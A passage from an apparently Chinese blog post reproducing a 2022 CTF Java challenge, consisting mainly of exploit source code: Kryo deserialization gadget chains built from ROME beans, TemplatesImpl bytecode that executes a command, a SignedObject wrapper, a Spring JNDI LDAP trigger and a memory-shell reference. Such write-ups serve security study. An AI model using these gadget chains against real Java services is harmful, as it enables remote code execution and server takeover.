class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(os);</span><br><span class="line">HessianBase.<span class="type">NoWriteReplaceSerializerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianBase</span>.NoWriteReplaceSerializerFactory();</span><br><span class="line">sf.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">output.setSerializerFactory(sf);</span><br><span class="line">output.writeObject(map);</span><br><span class="line">output.getBytesOutputStream().flush();</span><br><span class="line">output.completeMessage();</span><br><span class="line">output.close();</span><br><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(os.toByteArray())));</span><br></pre></td></tr></table></figure><p><code>javaagent</code>注入内存马</p><h3 id="4-参考"><a href="#4-参考" class="headerlink" title="4.参考"></a>4.参考</h3><blockquote><p>1.<a href="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/#FactoryTransformer">https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/#FactoryTransformer</a></p><p>2.<a href="https://mp.weixin.qq.com/s?__biz=MzI3NTg2NTk5Mg==&amp;mid=2247484132&amp;idx=1&amp;sn=55fdb98a839bd2e0a8d14934a0fef757&amp;chksm=eb7f0a03dc0883155a73e1c9326e28be458aa55b7847c5390a43df8702403facb84ab0a06a04&amp;mpshare=1&amp;scene=22&amp;srcid=0425FBJKvWlNewXNv00ett0i&amp;sharer_sharetime=1650892131994&amp;sharer_shareid=ef2a828dd213b828cd3fe897350642f0#rd">https://mp.weixin.qq.com/s?__biz=MzI3NTg2NTk5Mg==&amp;mid=2247484132&amp;idx=1&amp;sn=55fdb98a839bd2e0a8d14934a0fef757&amp;chksm=eb7f0a03dc0883155a73e1c9326e28be458aa55b7847c5390a43df8702403facb84ab0a06a04&amp;mpshare=1&amp;scene=22&amp;srcid=0425FBJKvWlNewXNv00ett0i&amp;sharer_sharetime=1650892131994&amp;sharer_shareid=ef2a828dd213b828cd3fe897350642f0#rd</a></p><p>3.<a href="https://blog.wm-team.cn/index.php/archives/18/">https://blog.wm-team.cn/index.php/archives/18/</a></p></blockquote><h3 id="5-代码"><a href="#5-代码" class="headerlink" title="5. 代码"></a>5. 代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mrtf.springcoffee.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.Kryo;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Input;</span><br><span class="line"><span class="keyword">import</span> com.esotericsoftware.kryo.io.Output;</span><br><span class="line"><span class="keyword">import</span> com.mrtf.springcoffee.shell.MSpringJNIController;</span><br><span class="line"><span class="keyword">import</span> com.mrtf.springcoffee.util.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.impl.NoOpLog;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.BeanFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.mrtf.springcoffee.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Kryo</span> <span class="variable">kryo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Message <span class="title function_">order</span><span class="params">(CoffeeRequest coffee)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (coffee.extraFlavor != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(coffee.extraFlavor));</span><br><span class="line">            <span class="type">Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Input</span>(bas);</span><br><span class="line">            <span class="type">ExtraFlavor</span> <span class="variable">flavor</span> <span class="operator">=</span> (ExtraFlavor)<span class="built_in">this</span>.kryo.readClassAndObject(input);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, flavor.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.espresso &gt; <span class="number">0.5D</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;DOPPIO&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.hotWater &gt; <span class="number">0.5D</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;AMERICANO&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (coffee.milkFoam &gt; <span class="number">0.0D</span> &amp;&amp; coffee.steamMilk &gt; <span class="number">0.0D</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> coffee.steamMilk &gt; coffee.milkFoam ? <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;CAPPUCCINO&quot;</span>) : <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;Latte&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> coffee.espresso &gt; <span class="number">0.0D</span> ? <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;Espresso&quot;</span>) : <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;empty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Message <span class="title function_">demoFlavor</span><span class="params">(String raw)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(raw);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">serializeConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(raw);</span><br><span class="line">        <span class="keyword">if</span> (serializeConfig.has(<span class="string">&quot;polish&quot;</span>) &amp;&amp; serializeConfig.getBoolean(<span class="string">&quot;polish&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo = <span class="keyword">new</span> <span class="title class_">Kryo</span>();</span><br><span class="line">            Method[] var3 = <span class="built_in">this</span>.kryo.getClass().getDeclaredMethods();</span><br><span class="line">            <span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> var3.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">setMethod</span> <span class="operator">=</span> var3[var5];</span><br><span class="line">                <span class="keyword">if</span> (setMethod.getName().startsWith(<span class="string">&quot;set&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">p1</span> <span class="operator">=</span> serializeConfig.get(setMethod.getName().substring(<span class="number">3</span>));</span><br><span class="line">                        <span class="keyword">if</span> (!setMethod.getParameterTypes()[<span class="number">0</span>].isPrimitive()) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                p1 = Class.forName((String)p1).newInstance();</span><br><span class="line">                                setMethod.invoke(<span class="built_in">this</span>.kryo, p1);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">                                var9.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            setMethod.invoke(<span class="built_in">this</span>.kryo, p1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos);</span><br><span class="line">        <span class="built_in">this</span>.kryo.register(Mocha.class);</span><br><span class="line">        <span class="built_in">this</span>.kryo.writeClassAndObject(output, <span class="keyword">new</span> <span class="title class_">Mocha</span>());</span><br><span class="line">        output.flush();</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Message</span>(<span class="number">200</span>, <span class="string">&quot;Mocha!&quot;</span>, Base64.getEncoder().encode(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BeanFactory <span class="title function_">makeJNDITrigger</span> <span class="params">(String jndiUrl )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        bf.setShareableResources(jndiUrl);</span><br><span class="line">        setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">        <span class="keyword">return</span> bf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeBeanFactoryTriggerBFPA</span> <span class="params">( String name, BeanFactory bf )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">pcadv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        pcadv.setBeanFactory(bf);</span><br><span class="line">        pcadv.setAdviceBeanName(name);</span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        c.setAdviceBeanName(name);</span><br><span class="line">        c.setBeanFactory(bf);</span><br><span class="line">        <span class="keyword">return</span> makeMap(pcadv, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">byte</span>[] genpayload1()<span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:1389/obj&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> makeBeanFactoryTriggerBFPA(jndiUrl, makeJNDITrigger(jndiUrl));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos) ) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo.writeClassAndObject(output, o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(bytes);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genByteCode() <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;whoops!\&quot;);java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] genpayload() <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//        final byte[] bytes1 = ClassPool.getDefault().get(ysoserial.payloads.test2.class.getName()).toBytecode();</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;ClassPool.getDefault().get(MSpringJNIController.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">item</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, obj);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, item);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,root);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">so</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        so = <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(SignedObject.class, so);</span><br><span class="line">        <span class="type">ObjectBean</span>  <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, delegate);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> makeMap(ob, ob);</span><br><span class="line"><span class="comment">//        ObjectBean delegate = new ObjectBean(Templates.class, obj);</span></span><br><span class="line"><span class="comment">//        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashmap = makeMap(root,root);</span></span><br><span class="line"><span class="comment">//        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span></span><br><span class="line"><span class="comment">//        keyPairGenerator.initialize(1024);</span></span><br><span class="line"><span class="comment">//        KeyPair keyPair = keyPairGenerator.genKeyPair();</span></span><br><span class="line"><span class="comment">//        PrivateKey privateKey = keyPair.getPrivate();</span></span><br><span class="line"><span class="comment">//        Signature signature = Signature.getInstance(privateKey.getAlgorithm());</span></span><br><span class="line"><span class="comment">//        SignedObject signedObject = new SignedObject(hashmap, privateKey, signature);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);</span></span><br><span class="line"><span class="comment">//        EqualsBean root1 = new EqualsBean(ToStringBean.class, item);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashmap1 = makeMap(root1,root1);</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos) ) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo.writeClassAndObject(output, o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        main.demoFlavor(<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;polish\&quot;:True,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;References\&quot;:True,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;RegistrationRequired\&quot;:False,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;InstantiatorStrategy\&quot;:\&quot;org.objenesis.strategy.StdInstantiatorStrategy\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = main.genpayload();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes);</span><br><span class="line">        <span class="type">CoffeeRequest</span> <span class="variable">coffee</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeRequest</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(coffee);</span><br><span class="line">        coffee.setExtraFlavor(s);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line"><span class="comment">//        main.order(coffee);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>util</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mrtf.springcoffee.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;restriction&quot;</span> )</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflections</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor ( <span class="keyword">final</span> String name ) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[ <span class="number">0</span> ];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全, CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
